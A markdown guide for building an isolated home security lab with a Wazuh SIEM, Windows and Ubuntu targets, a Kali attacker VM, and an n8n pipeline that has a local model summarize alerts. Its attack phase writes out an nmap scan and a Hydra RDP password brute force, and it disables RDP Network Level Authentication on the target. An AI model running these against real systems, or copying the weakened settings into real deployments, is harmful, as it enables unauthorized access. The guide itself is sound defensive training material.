
# 🧪 Cybersecurity Home Lab — Setup Guide

An isolated lab environment: a SIEM monitoring two endpoints, an attacker VM, and an automated AI-assisted alert pipeline.

---

## 📖 Table of Contents

1. [What You Need Before Starting](#-what-you-need-before-starting)
2. [Network Plan](#-network-plan)
3. [Phase 1 — Install the Hypervisor](#phase-1--install-the-hypervisor)
4. [Phase 2 — Build the Private Network](#phase-2--build-the-private-network)
5. [Phase 3 — Build the Wazuh SIEM](#phase-3--build-the-wazuh-siem)
6. [Phase 4 — Build the Windows Target](#phase-4--build-the-windows-target)
7. [Phase 5 — Build the Ubuntu Target](#phase-5--build-the-ubuntu-target)
8. [Phase 6 — Build the Kali Attacker](#phase-6--build-the-kali-attacker)
9. [Phase 7 — Run the Attack Simulation](#phase-7--run-the-attack-simulation)
10. [Phase 8 — Automate Alert Triage with AI](#phase-8--automate-alert-triage-with-ai)
11. [🧯 Troubleshooting](#-troubleshooting)
12. [🏁 Final Checklist](#-final-checklist)

---

## 🎒 What You Need Before Starting

- [ ] A computer running **Ubuntu Desktop 22.04** with **at least 16GB RAM**
- [ ] At least **250GB free disk space**
- [ ] Downloaded ahead of time:
  - [ ] VMware Workstation Pro (free for personal use)
  - [ ] An Ubuntu Desktop `.iso`
  - [ ] A Windows 10 `.iso`
  - [ ] A Kali Linux VMware image (pre-built)

---

## 🗺️ Network Plan

| VM | Role | Static IP |
|---|---|---|
| Wazuh-SIEM | SIEM | `192.168.100.10` |
| Win10-TargetA | Windows target | `192.168.100.20` |
| Ubuntu-TargetB | Linux target | `192.168.100.30` |
| Kali-Attacker | Attacker | `192.168.100.40` |

All on an isolated VMware host-only network: `192.168.100.0/24`, no DHCP, no gateway.

---

## Phase 1 — Install the Hypervisor

### Step 1.1 — Install prerequisites

```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r) gcc make perl git curl
```

### Step 1.2 — Install VMware Workstation Pro

```bash
cd ~/Downloads
chmod +x VMware-Workstation-Full-*.bundle
sudo ./VMware-Workstation-Full-*.bundle --console --eulas-agreed --required
```

### Step 1.3 — Verify

```bash
sudo modprobe vmnet
sudo modprobe vmmon
systemctl status vmware --no-pager
```

✅ Expected: `active (running)`

---

## Phase 2 — Build the Private Network

### Step 2.1 — Open the Network Editor

```bash
sudo /usr/bin/vmware-netcfg
```

### Step 2.2 — Configure VMnet2

1. **Change Settings** → **Add Network** → **VMnet2**
2. Select **Host-only**
3. Subnet IP: `192.168.100.0`, mask: `255.255.255.0`
4. **Uncheck** "Use local DHCP service"
5. **Check** "Connect a host virtual adapter"
6. Apply → OK

### Step 2.3 — Verify

```bash
ip addr show vmnet2
```

✅ Expected: `inet 192.168.100.1/24`

> ⚠️ When assigning a static IP to any VM on this network, do **not** set a gateway. VMnet2 has no gateway — setting one creates a conflicting default route and breaks connectivity.

---

## Phase 3 — Build the Wazuh SIEM

### Step 3.1 — Create the VM

| Setting | Value |
|---|---|
| ISO | Ubuntu Desktop |
| Name | `Wazuh-SIEM` |
| Memory | 6144 MB |
| Processors | 2 |
| Disk | 80 GB, split into multiple files |
| Network Adapter | Custom → VMnet2 |

### Step 3.2 — Set static IP

```bash
nmcli con show
sudo nmcli con mod "Wired connection 1" \
  ipv4.addresses "192.168.100.10/24" \
  ipv4.dns "8.8.8.8,1.1.1.1" \
  ipv4.method manual
sudo nmcli con up "Wired connection 1"
ip addr show
```

✅ Expected: `192.168.100.10/24`

### Step 3.3 — Install Wazuh (all-in-one)

```bash
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
sudo bash ./wazuh-install.sh -a
```

### Step 3.4 — Retrieve the admin password

```bash
sudo cat /root/wazuh-passwords.txt
```

### Step 3.5 — Verify services

```bash
sudo systemctl status wazuh-manager --no-pager
sudo systemctl status wazuh-indexer --no-pager
sudo systemctl status wazuh-dashboard --no-pager
```

✅ Expected: `active (running)` for all three

### Step 3.6 — Access the dashboard

From your host browser:

```
https://192.168.100.10
```

Login: `admin` / password from Step 3.4

---

## Phase 4 — Build the Windows Target

### Step 4.1 — Create the VM

| Setting | Value |
|---|---|
| ISO | Windows 10 |
| Name | `Win10-TargetA` |
| Memory | 3072 MB |
| Processors | 2 |
| Disk | 80 GB |
| Network Adapter 1 | Custom → VMnet2 |
| Network Adapter 2 | NAT (temporary) |

### Step 4.2 — Set static IP

```powershell
Get-NetAdapter
New-NetIPAddress -InterfaceIndex 3 -IPAddress 192.168.100.20 -PrefixLength 24
Set-DnsClientServerAddress -InterfaceIndex 3 -ServerAddresses 8.8.8.8,1.1.1.1
ipconfig
```

✅ Expected: `192.168.100.20`

### Step 4.3 — Install Sysmon

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile Sysmon.zip
Expand-Archive Sysmon.zip -DestinationPath .\Sysmon
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile sysmonconfig-export.xml
.\Sysmon\Sysmon64.exe -accepteula -i sysmonconfig-export.xml
```

### Step 4.4 — Confirm the Wazuh manager version

```bash
# on Wazuh-SIEM
sudo /var/ossec/bin/wazuh-control info
```

### Step 4.5 — Install the matching Wazuh Agent

```powershell
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.2-1.msi" -OutFile wazuh-agent.msi
msiexec.exe /i wazuh-agent.msi WAZUH_MANAGER="192.168.100.10" WAZUH_AGENT_GROUP="WindowsLab"
Start-Service -Name "WazuhSvc"
Get-Service -Name "WazuhSvc"
```

✅ Expected: `Running`

> ⚠️ If the install appears to succeed but no service exists, the agent version likely doesn't match the manager. Uninstall, delete `C:\Program Files (x86)\ossec-agent`, reinstall the exact matching version.

> ⚠️ If the log shows `Invalid group: WindowsLab (from manager)`, create the group on the manager first:
> ```bash
> sudo /var/ossec/bin/agent_groups -a -g WindowsLab -q
> ```

### Step 4.6 — Open required firewall rules

```powershell
netsh advfirewall firewall add rule name="Allow ICMPv4-In" protocol=icmpv4:8,any dir=in action=allow
netsh advfirewall firewall add rule name="Allow SMB In" dir=in action=allow protocol=TCP localport=445
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
```

### Step 4.7 — Verify

Wazuh Dashboard → **Agents** → confirm this host shows **Active**.

---

## Phase 5 — Build the Ubuntu Target

### Step 5.1 — Create the VM

| Setting | Value |
|---|---|
| ISO | Ubuntu Desktop |
| Name | `Ubuntu-TargetB` |
| Memory | 3072–4096 MB |
| Disk | 40 GB |
| Network Adapter 1 | VMnet2 |
| Network Adapter 2 | NAT (temporary) |

### Step 5.2 — Set static IP

```bash
nmcli con show
sudo nmcli con mod "<connection name>" \
  ipv4.addresses "192.168.100.30/24" \
  ipv4.dns "8.8.8.8,1.1.1.1" \
  ipv4.method manual
sudo nmcli con up "<connection name>"
```

### Step 5.3 — Install the Wazuh Agent

```bash
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt update
sudo apt install -y wazuh-agent
sudo sed -i 's/<address>.*<\/address>/<address>192.168.100.10<\/address>/' /var/ossec/etc/ossec.conf
sudo systemctl daemon-reload
sudo systemctl enable --now wazuh-agent
```

### Step 5.4 — Verify

```bash
sudo tail -30 /var/ossec/logs/ossec.log
```

✅ Expected: `Connected to the server`

Confirm **Active** status in the Wazuh dashboard's Agents page.

---

## Phase 6 — Build the Kali Attacker

### Step 6.1 — Open the pre-built image

**File → Open a Virtual Machine** → select the Kali `.vmx` file.

### Step 6.2 — Configure hardware

| Setting | Value |
|---|---|
| Memory | 2–4 GB |
| Network Adapter 1 | Custom → VMnet2 |
| Network Adapter 2 | NAT (add if not present) |

### Step 6.3 — Set static IP

```bash
nmcli con show
sudo nmcli con mod "Wired connection 1" \
  ipv4.addresses "192.168.100.40/24" \
  ipv4.dns "8.8.8.8,1.1.1.1" \
  ipv4.method manual
sudo nmcli con up "Wired connection 1"
```

> ⚠️ Do not set `ipv4.gateway` on this connection.

### Step 6.4 — Verify connectivity

```bash
ip route show
ping -c 4 192.168.100.10
ping -c 4 192.168.100.20
ping -c 4 8.8.8.8
```

✅ Expected: a single default route, and 0% packet loss on all three pings.

---

## Phase 7 — Run the Attack Simulation

### Step 7.1 — Write the attack script

```bash
sudo nano /root/attack-lab.sh
```

```bash
#!/bin/bash
TARGET="192.168.100.20"

nmap -Pn -sS -sV -O -p 445,3389,5985,22 --script smb-os-discovery "$TARGET"

hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://"$TARGET" -t 1 -W 1 -c 1 -f
```

### Step 7.2 — Prepare the wordlist (first time only)

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Step 7.3 — Run it

```bash
sudo chmod +x /root/attack-lab.sh
sudo /root/attack-lab.sh
```

Let it run 60–90 seconds, then stop with `Ctrl+C` if needed.

> ⚠️ If Hydra returns `invalid reply from target` against SMB, modern Windows disables SMBv1 by default — this is why the script targets RDP instead (requires Step 4.6's RDP/NLA changes).

### Step 7.4 — Confirm detection

Wazuh Dashboard → **Threat Hunting** → search:

```
rule.level >= 9
```

✅ Expected entries:

| Rule | Level | Description |
|---|---|---|
| 60204 | 10 | Multiple Windows Logon Failures |
| 60115 | 9 | User account locked out (multiple login errors) |

---

## Phase 8 — Automate Alert Triage with AI

### Step 8.1 — Expose the Wazuh Indexer API

```bash
sudo nano /etc/wazuh-indexer/opensearch.yml
```

Change:
```yaml
network.host: 127.0.0.1
```
to:
```yaml
network.host: 0.0.0.0
```

```bash
sudo systemctl restart wazuh-indexer
```

Verify from the host:

```bash
curl -k -u admin:<password> https://192.168.100.10:9200
```

✅ Expected: JSON response containing `"cluster_name" : "wazuh-cluster"`

### Step 8.2 — Build the n8n workflow

**Node 1 — Schedule Trigger:** every 1 minute.

**Node 2 — HTTP Request (Wazuh):**
- `POST https://192.168.100.10:9200/wazuh-alerts-*/_search`
- Basic Auth: `admin` / Wazuh password
- Ignore SSL Issues: ON
- Body:
```json
{
  "size": 5,
  "sort": [{"timestamp": {"order": "desc"}}],
  "query": {
    "bool": {
      "must": [
        {"range": {"rule.level": {"gte": 9}}},
        {"range": {"timestamp": {"gte": "now-5m"}}}
      ]
    }
  }
}
```

**Node 3 — Code (JavaScript):**
```javascript
const hits = $input.first().json.hits.hits;
if (!hits || hits.length === 0) { return []; }
return hits.map(hit => ({
  json: {
    timestamp: hit._source.timestamp,
    agent: hit._source.agent?.name || "unknown",
    rule_id: hit._source.rule?.id,
    rule_level: hit._source.rule?.level,
    rule_description: hit._source.rule?.description,
    raw_data: JSON.stringify(hit._source.data || {})
  }
}));
```

**Node 4 — HTTP Request (Ollama):**
- `POST http://host.docker.internal:11434/api/generate`
- Body mode: Fields (not raw JSON text)
  - `model` = `llama3.1:8b`
  - `stream` = `false` (Expression mode: `{{ false }}`)
  - `prompt` = includes `{{ $json.rule_description }}` and the other fields from Node 3

**Node 5 — Postgres:**

Create the table once:
```sql
CREATE TABLE IF NOT EXISTS wazuh_ai_alerts (
    id SERIAL PRIMARY KEY,
    alert_timestamp TIMESTAMPTZ,
    agent TEXT,
    rule_id TEXT,
    rule_level INT,
    rule_description TEXT,
    ai_summary TEXT,
    logged_at TIMESTAMPTZ DEFAULT now()
);
```

Execute Query node:
```sql
INSERT INTO wazuh_ai_alerts (alert_timestamp, agent, rule_id, rule_level, rule_description, ai_summary)
VALUES (
  '{{ $('Code in JavaScript').item.json.timestamp }}',
  '{{ $('Code in JavaScript').item.json.agent }}',
  '{{ $('Code in JavaScript').item.json.rule_id }}',
  {{ $('Code in JavaScript').item.json.rule_level }},
  '{{ $('Code in JavaScript').item.json.rule_description }}',
  '{{ $json.response.replace(/'/g, "''") }}'
);
```

> ⚠️ Use `host.docker.internal` for both Ollama and Postgres connections (not `localhost`) — n8n runs inside its own container network. Node name references (e.g. `$('Code in JavaScript')`) must exactly match the node's actual name.

### Step 8.3 — Publish the workflow

Click **Publish** (or toggle Active) so it runs automatically on schedule.

### Step 8.4 — Verify end-to-end

Run the attack script again, wait ~1 minute, then:

```bash
docker exec -it dev-postgres psql -U <user> -d <database> -c "SELECT * FROM wazuh_ai_alerts;"
```

✅ Expected: a row containing the alert data and an AI-generated summary in `ai_summary`.

---

## 🧯 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| "Destination Host Unreachable" between VMs | Target VM is powered off | Power it on, wait 30–45s, retest |
| VM has no internet and can't reach other VMs | Gateway set on the isolated network | `sudo nmcli con mod "<name>" ipv4.gateway ""` |
| Windows agent installs but no service exists | Agent/manager version mismatch | Reinstall exact matching agent version |
| "Invalid group" in agent log | Group doesn't exist on manager | `sudo /var/ossec/bin/agent_groups -a -g <name> -q` |
| External tool can't reach port 9200 | Indexer bound to localhost only | Set `network.host: 0.0.0.0`, restart service |
| Hydra SMB brute force fails instantly | SMBv1 disabled by default | Use RDP instead, disable NLA on target |
| n8n "not valid JSON" error | Hand-typed JSON body broken by special characters | Use field-based body instead |
| n8n can't reach Ollama/Postgres | Used `localhost` instead of `host.docker.internal` | Point to `host.docker.internal` |
| Live installer crashes/freezes | Insufficient VM RAM | Temporarily increase RAM, install, then reduce |
| Invisible cursor in Kali | VMware display bug | VM → Manage → Change Hardware Compatibility → Alter this VM → latest version |

---

## 🏁 Final Checklist

- [ ] VMnet2 created, no gateway conflicts
- [ ] Wazuh-SIEM installed, dashboard reachable, all services active
- [ ] Windows target: Sysmon + matching Wazuh Agent, Active
- [ ] Ubuntu target: Wazuh Agent, Active
- [ ] Kali: networked correctly, reaches all targets + internet
- [ ] Attack simulation run, Level 9+ alert confirmed
- [ ] n8n workflow built and published
- [ ] Ollama returning summaries
- [ ] Postgres storing rows end-to-end
